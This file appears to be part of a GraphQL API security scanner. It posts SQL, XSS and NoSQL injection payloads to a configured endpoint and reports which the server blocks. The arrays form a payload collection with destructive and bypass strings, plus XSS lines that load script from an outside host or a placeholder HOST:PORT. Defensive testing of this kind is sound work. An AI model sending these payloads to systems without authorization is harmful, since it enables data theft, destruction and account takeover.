const {
	green,
	greenBold,
	greenItalic,
	greenHighlight,
	greenUnderlined,
	greenOut,
	red,
	redBold,
	redItalic,
	redHighlight,
	redUnderlined,
	redOut,
	dark,
	darkBold,
	darkItalic,
	darkHighlight,
	darkUnderlined,
	darkOut,
	yellow,
	yellowBold,
	yellowItalic,
	yellowHighlight,
	yellowUnderlined,
	yellowOut,
	bold,
	italic,
	highlight,
	underlined,
	whiteOut,
} = require('../../color');
const fs = require('fs');
const path = require('path');

// Get config file
const configPath = path.resolve(__dirname, '../qevlarConfig.json');
// Read config file
let config = {};
try {
	const configFile = fs.readFileSync(configPath, 'utf8');
	// Set config object
	config = JSON.parse(configFile);
} catch (error) {
	console.error('Error reading config file:', error);
}

const maliciousInjectionTest = {};

maliciousInjectionTest.SQL = async (returnToTestMenu) => {
	if (!config.SQL) {
		console.log(
			'SQL config variable must be set to boolean true to execute SQL injection test.'
		);
		return;
	}

	let successfulQuery = true;
	const blockedInjections = [];
	const allowedInjections = [];

	const potentiallyMaliciousSQL = [
		'Block me!"', //purposefully blocked, added double quote
		'1=1',
		`' OR`,
		'select sqlite_version()',
		'@@version',
		'DROP TABLE',
		'UNION SELECT null',
		'SELECT sql FROM sqlite_schema',
		`SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'`,
		'OR 1=0',
		'OR x=x',
		'OR x=y',
		'OR 1=1#',
		'OR 1=0#',
		'OR x=x#',
		'OR x=y#',
		'OR 1=1-- ',
		'OR 1=0-- ',
		'OR x=x-- ',
		'OR x=y--',
		'HAVING 1=1',
		'HAVING 1=0',
		'HAVING 1=1#',
		'HAVING 1=0#',
		'HAVING 1=1--',
		'HAVING 1=0--',
		'AND 1=1',
		'AND 1=0',
		'AND 1=1--',
		'AND 1=0--',
		'AND 1=1#',
		'AND 1=0#',
		"AND 1=1 AND '%'='",
		"AND 1=0 AND '%'='",
		'AND 1083=1083 AND (1427=1427',
		'AND 7506=9091 AND (5913=5913',
		`AND 1083=1083 AND (1427=1427`,
		'AND 7506=9091 AND (5913=5913',
		'AND 7300=7300 AND (pKlZ=pKlZ',
		'AND 7300=7300 AND (pKlZ=pKlY',
		'AS INJECTX WHERE 1=1 AND 1=1',
		'AS INJECTX WHERE 1=1 AND 1=0',
		'AS INJECTX WHERE 1=1 AND 1=1#',
		'AS INJECTX WHERE 1=1 AND 1=0#',
		'AS INJECTX WHERE 1=1 AND 1=1--',
		'AS INJECTX WHERE 1=1 AND 1=0--',
		'WHERE 1=1 AND 1=1',
		'WHERE 1=1 AND 1=0',
		'WHERE 1=1 AND 1=1#',
		'WHERE 1=1 AND 1=0#',
		'WHERE 1=1 AND 1=1--',
		'WHERE 1=1 AND 1=0--',
		'ORDER BY 1-- ',
		'ORDER BY 2-- ',
		'ORDER BY 3-- ',
		'ORDER BY 4-- ',
		'ORDER BY 5-- ',
		'ORDER BY 6-- ',
		'ORDER BY 7-- ',
		'ORDER BY 8-- ',
		'ORDER BY 9-- ',
		'ORDER BY 10-- ',
		'ORDER BY 11-- ',
		'ORDER BY 12-- ',
		'ORDER BY 13-- ',
		'ORDER BY 14-- ',
		'ORDER BY 15-- ',
		'ORDER BY 16-- ',
		'ORDER BY 17-- ',
		'ORDER BY 18-- ',
		'ORDER BY 19-- ',
		'ORDER BY 20-- ',
		'ORDER BY 21-- ',
		'ORDER BY 22-- ',
		'ORDER BY 23-- ',
		'ORDER BY 24-- ',
		'ORDER BY 25-- ',
		'ORDER BY 26-- ',
		'ORDER BY 27-- ',
		'ORDER BY 28-- ',
		'ORDER BY 29-- ',
		'ORDER BY 30-- ',
		'ORDER BY 31337--',
		'ORDER BY 1# ',
		'ORDER BY 2# ',
		'ORDER BY 3# ',
		'ORDER BY 4# ',
		'ORDER BY 5# ',
		'ORDER BY 6# ',
		'ORDER BY 7# ',
		'ORDER BY 8# ',
		'ORDER BY 9# ',
		'ORDER BY 10# ',
		'ORDER BY 11# ',
		'ORDER BY 12# ',
		'ORDER BY 13# ',
		'ORDER BY 14# ',
		'ORDER BY 15# ',
		'ORDER BY 16# ',
		'ORDER BY 17# ',
		'ORDER BY 18# ',
		'ORDER BY 19# ',
		'ORDER BY 20# ',
		'ORDER BY 21# ',
		'ORDER BY 22# ',
		'ORDER BY 23# ',
		'ORDER BY 24# ',
		'ORDER BY 25# ',
		'ORDER BY 26# ',
		'ORDER BY 27# ',
		'ORDER BY 28# ',
		'ORDER BY 29# ',
		'ORDER BY 30#',
		'ORDER BY 31337#',
		'1 or sleep(5)#',
		`' or sleep(5)#`,
		`' or sleep(5)#`,
		`' or sleep(5)='`,
		`' or sleep(5)='`,
		'1) or sleep(5)#',
		'ORDER BY SLEEP(5)',
		'ORDER BY SLEEP(5)--',
		'ORDER BY SLEEP(5)#',
		`ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))`,
		`ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4`,
		'UNION ALL SELECT 1',
		'UNION ALL SELECT 1,2',
		'UNION ALL SELECT 1,2,3;',
		'UNION ALL SELECT 1-- ',
		`'admin' --`,
		`admin' #`,
		`'admin'/*`,
		`'admin' or '1'='1`,
	];

	for (const maliciousSnippet of potentiallyMaliciousSQL) {
		await fetch(config.API_URL, {
			method: 'POST',
			headers: {
				'content-type': 'application/json',
			},
			body: JSON.stringify({
				query: `query {
           ${config.SQL_TABLE_NAME}(sql: "${maliciousSnippet}") {
            ${config.SQL_COLUMN_NAME}
           }
         }`,
			}),
		}).then((res) => {
			if (!res.ok) {
				successfulQuery = false;
				blockedInjections.push(maliciousSnippet);
			} else allowedInjections.push(maliciousSnippet + '\n');
		});
	}
	console.log(
		underlined(greenBold('\nPotentially malicious queries blocked: \n\n')),
		blockedInjections
	);
	console.log(
		underlined(redBold('\nPotentially malicious queries allowed: \n\n')),
		red(allowedInjections)
	);
	if (returnToTestMenu) returnToTestMenu();
};

maliciousInjectionTest.XSS = async (returnToTestMenu) => {
	let successfulQuery = true;
	const blockedInjections = ['Block me!'];
	const allowedInjections = [];

	const potentiallyMaliciousXSS = [
		'"-prompt(8)-"',
		"'-prompt(8)-'",
		'";a=prompt,a()//',
		"';a=prompt,a()//",
		`'-eval("window['pro'%2B'mpt'](8)")-'`,
		`"-eval("window['pro'%2B'mpt'](8)")-"`,
		'"onclick=prompt(8)>"@x.y',
		'"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y',
		'<image/src/onerror=prompt(8)>',
		'<img/src/onerror=prompt(8)>',
		'<image src/onerror=prompt(8)>',
		'<img src/onerror=prompt(8)>',
		'<image src =q onerror=prompt(8)>',
		'<img src =q onerror=prompt(8)>',
		'</scrip</script>t><img src =q onerror=prompt(8)>',
		'<svg onload=alert(1)>',
		'"><svg onload=alert(1)//',
		'"onmouseover=alert(1)//',
		'"autofocus/onfocus=alert(1)//',
		"'-alert(1)-'",
		"'-alert(1)//",
		"'-alert(1)//",
		'</script><svg onload=alert(1)>',
		'<x contenteditable onblur=alert(1)>lose focus! ',
		'<x onclick=alert(1)>click this! ',
		'<x oncopy=alert(1)>copy this! ',
		'<x oncontextmenu=alert(1)>right click this! ',
		'<x oncut=alert(1)>copy this! ',
		'<x ondblclick=alert(1)>double click this! ',
		'<x ondrag=alert(1)>drag this! ',
		'<x contenteditable onfocus=alert(1)>focus this! ',
		'<x contenteditable oninput=alert(1)>input here! ',
		'<x contenteditable onkeydown=alert(1)>press any key! ',
		'<x contenteditable onkeypress=alert(1)>press any key! ',
		'<x contenteditable onkeyup=alert(1)>press any key! ',
		'<x onmousedown=alert(1)>click this! ',
		'<x onmousemove=alert(1)>hover this! ',
		'<x onmouseout=alert(1)>hover this! ',
		'<x onmouseover=alert(1)>hover this! ',
		'<x onmouseup=alert(1)>click this! ',
		'<x contenteditable onpaste=alert(1)>paste here!',
		'<script>alert(1)// ',
		'<script>alert(1)<!–',
		'<script src=//brutelogic.com.br/1.js> ',
		'<script src=//3334957647/1>',
		'%3Cx onxxx=alert(1) ',
		'<%78 onxxx=1 ',
		'<x %6Fnxxx=1 ',
		'<x o%6Exxx=1 ',
		'<x on%78xx=1 ',
		'<x onxxx%3D1',
		'<X onxxx=1 ',
		'<x OnXxx=1 ',
		'<X OnXxx=1 ',
		'<x onxxx=1 onxxx=1',
		'<x/onxxx=1 ',
		'<x%09onxxx=1 ',
		'<x%0Aonxxx=1 ',
		'<x%0Conxxx=1 ',
		'<x%0Donxxx=1 ',
		'<x%2Fonxxx=1 ',
		"<x 1='1'onxxx=1 ",
		'<x 1="1"onxxx=1',
		'<x </onxxx=1 ',
		'<x 1=">" onxxx=1 ',
		'<http://onxxx%3D1/',
		"<x onxxx=alert(1) 1='",
		"<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",
		"'onload=alert(1)><svg/1='",
		"'>alert(1)</script><script/1=' ",
		'*/alert(1)</script><script>/*',
		`*/alert(1)">'onload="/*<svg/1='`,
		`'-alert(1)">'onload="'<svg/1='`,
		"*/</script>'>alert(1)/*<script/1='",
		'<script>alert(1)</script> ',
		'<script src=javascript:alert(1)> ',
		'<iframe src=javascript:alert(1)> ',
		'<embed src=javascript:alert(1)> ',
		'<a href=javascript:alert(1)>click ',
		'<math><brute href=javascript:alert(1)>click ',
		'<form action=javascript:alert(1)><input type=submit> ',
		'<isindex action=javascript:alert(1) type=submit value=click> ',
		'<form><button formaction=javascript:alert(1)>click ',
		'<form><input formaction=javascript:alert(1) type=submit value=click> ',
		'<form><input formaction=javascript:alert(1) type=image value=click> ',
		'<form><input formaction=javascript:alert(1) type=image src=SOURCE> ',
		'<isindex formaction=javascript:alert(1) type=submit value=click> ',
		'<object data=javascript:alert(1)> ',
		'<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> ',
		'<svg><script xlink:href=data:,alert(1) /> ',
		'<math><brute xlink:href=javascript:alert(1)>click ',
		'<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>',
		'<html ontouchstart=alert(1)> ',
		'<html ontouchend=alert(1)> ',
		'<html ontouchmove=alert(1)> ',
		'<html ontouchcancel=alert(1)>',
		'<body onorientationchange=alert(1)>',
		'"><img src=1 onerror=alert(1)>.gif',
		'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>',
		'GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;',
	];

	for (const maliciousSnippet of potentiallyMaliciousXSS) {
		await fetch(config.API_URL, {
			method: 'POST',
			headers: {
				'content-type': 'application/json',
			},
			body: JSON.stringify({
				query: `query {
           ${config.TOP_LEVEL_FIELD}(id: ${config.ANY_TOP_LEVEL_FIELD_ID}) {
            id
            # ${maliciousSnippet}
           }
         }`,
			}),
		}).then((res) => {
			if (!res.ok) {
				successfulQuery = false;
				blockedInjections.push(maliciousSnippet);
			} else allowedInjections.push(maliciousSnippet + '\n');
		});
	}
	console.log(
		underlined(greenBold('\nPotentially malicious queries blocked: \n\n')),
		blockedInjections
	);
	console.log(
		underlined(redBold('\nPotentially malicious queries allowed: \n\n')),
		red(allowedInjections)
	);
	if (returnToTestMenu) returnToTestMenu();
};

maliciousInjectionTest.NoSQL = async (returnToTestMenu) => {
	if (!config.NoSQL) {
		console.log(
			'NoSQL config variable must be set to boolean true to execute NoSQL injection test.'
		);
		return;
	}
	let successfulQuery = true;
	const blockedInjections = [];
	const allowedInjections = [];

	const potentiallyMaliciousNoSQL = [
		"true, $where: '1 == 1'",
		", $where: '1 == 1'",
		"$where: '1 == 1'",
		"', $where: '1 == 1'",
		"1, $where: '1 == 1'",
		'{ $ne: 1 }',
		"', $or: [ {}, { 'a':'a",
		"' } ], $comment:'successful MongoDB injection'",
		'db.injection.insert({success:1});',
		'db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1',
		'|| 1==1',
		"' && this.password.match(/.*/)//+%00",
		"' && this.passwordzz.match(/.*/)//+%00",
		"'%20%26%26%20this.password.match(/.*/)//+%00",
		"'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
		"{$gt: ''}",
		'[$ne]=1',
		"';return 'a'=='a' && ''=='",
		'";return(true);var xyz=\'a',
		'0;return true',
	];

	for (const maliciousSnippet of potentiallyMaliciousNoSQL) {
		await fetch(config.API_URL, {
			method: 'POST',
			headers: {
				'content-type': 'application/json',
			},
			body: JSON.stringify({
				query: `query {
           ${config.SQL_TABLE_NAME}(sql: "${maliciousSnippet}") {
            ${config.SQL_COLUMN_NAME}
           }
         }`,
			}),
		}).then((res) => {
			if (!res.ok) {
				successfulQuery = false;
				blockedInjections.push(maliciousSnippet);
			} else allowedInjections.push(maliciousSnippet + '\n');
		});
	}
	console.log(
		underlined(greenBold('\nPotentially malicious queries blocked: \n\n')),
		blockedInjections
	);
	console.log(
		underlined(redBold('\nPotentially malicious queries allowed: \n\n')),
		red(allowedInjections)
	);
	if (returnToTestMenu) returnToTestMenu();
};

module.exports = maliciousInjectionTest;
